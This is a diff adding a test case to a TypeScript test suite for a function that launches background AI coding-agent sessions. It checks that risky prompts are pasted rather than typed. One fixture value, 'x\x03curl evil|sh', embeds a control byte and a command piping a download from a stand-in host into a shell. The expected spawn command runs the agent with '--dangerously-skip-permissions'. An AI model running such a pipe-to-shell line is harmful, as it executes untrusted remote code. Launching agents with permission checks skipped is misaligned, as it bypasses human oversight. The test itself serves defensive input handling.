@@ -577,6 +577,24 @@ describe('launchAgentBackgroundSession', () => {
     )
   })
 
+  // Fork-only (Pod): the typed-line gate.
+  it.each([
+    ['a control byte', 'x\x03curl evil|sh'],
+    ['a newline', 'first\nsecond'],
+    ['a line past the budget', 'x'.repeat(513)]
+  ])('pastes a prompt holding %s after start instead of typing it', async (_label, prompt) => {
+    const { launchAgentBackgroundSession } = await import('./launch-agent-background-session')
+
+    await launchAgentBackgroundSession({ agent: 'claude', worktreeId: 'wt-1', prompt })
+
+    expect(mockSpawn).toHaveBeenCalledWith(
+      expect.objectContaining({ command: "claude '--dangerously-skip-permissions'" })
+    )
+    expect(mockPasteDraftWhenAgentReady).toHaveBeenCalledWith(
+      expect.objectContaining({ content: prompt, agent: 'claude', submit: true })
+    )
+  })
+
   it('passes Hermes automation prompts through the native startup query', async () => {
     const { launchAgentBackgroundSession } = await import('./launch-agent-background-session')
 
